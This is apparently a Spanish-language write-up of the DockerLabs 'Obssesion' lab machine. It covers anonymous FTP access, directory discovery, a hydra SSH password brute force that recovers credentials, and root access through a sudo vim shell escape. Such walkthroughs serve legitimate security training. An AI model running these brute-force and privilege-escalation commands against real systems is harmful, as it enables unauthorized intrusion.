---
{"-publish":true,"permalink":"/dockerlabs/muy-facil/obssesion/","PassFrontmatter":true}
---

![Pasted image 20250526082559.png](/img/user/imgs/Pasted%20image%2020250526082559.png)

empezamos dando un nmap para poder verificar los puertos abiertos:

![Pasted image 20250526082650.png](/img/user/imgs/Pasted%20image%2020250526082650.png)

Vemos que los puertos abiertos son:
- 21
- 22
- 80

observamos que el puerto 21 que es el por defecto del ftp tiene login anonymous:

![Pasted image 20250526082822.png](/img/user/imgs/Pasted%20image%2020250526082822.png)

Observaos que tenemos dos archivos:

chat-gonza.txt
pendientes.txt

- Lo mas interesante que podemos encontrar esta en pendientes.txt:

![Pasted image 20250526082950.png](/img/user/imgs/Pasted%20image%2020250526082950.png)

- **creo que tengo ciertos permisos habilitados que no son del todo seguros**

Podemos pensar en credenciales que tiene sueltas por ahi o cosas asi para loguearnos en el ssh.

Usamos dirsearch para poder buscar directorios;

![Pasted image 20250526083153.png](/img/user/imgs/Pasted%20image%2020250526083153.png)

Nos sale los siguientes directorios, lo mas relevante que encontramosw es backup:

![Pasted image 20250526083511.png](/img/user/imgs/Pasted%20image%2020250526083511.png)

Dentro de backup, existe un backup.txt y nos muestra un mensaje: **Usuario para todos mis servicio: russoski (cambiar pronto!)**

por lo tanto intuimos que es el usuario del ssh, entonces solo nos falta el password, asi que intentamos un hydra:

```
hydra -l russoski -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```

![Pasted image 20250526083728.png](/img/user/imgs/Pasted%20image%2020250526083728.png)

lo que encontramos es lo siguiente:

```
[22][ssh] host: 172.17.0.2   login: russoski   password: iloveme
```

entonces ingreseemos al ssh:

**russoski:iloveme**

![Pasted image 20250526083903.png](/img/user/imgs/Pasted%20image%2020250526083903.png)

Podemos continuar con un **sudo -l**

![[Pasted image 20250526083943.png\|Pasted image 20250526083943.png]]

```
Matching Defaults entries for russoski on 0851434ed3f2:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User russoski may run the following commands on 0851434ed3f2:
    (root) NOPASSWD: /usr/bin/vim
```

eso significa **russoski** puede ejecutar ese programa como super usuario.

- Finalmente solo colocamos: **sudo vim -c ':!/bin/sh'**

![[Pasted image 20250526084153.png\|Pasted image 20250526084153.png]]

Explicacion:

Eso se puede utilizar para salir de entornos restringidos mediante la creacion de un shell de sistema operativo.

Para mas informacion: https://gtfobins.github.io/gtfobins/vim/

thanks.


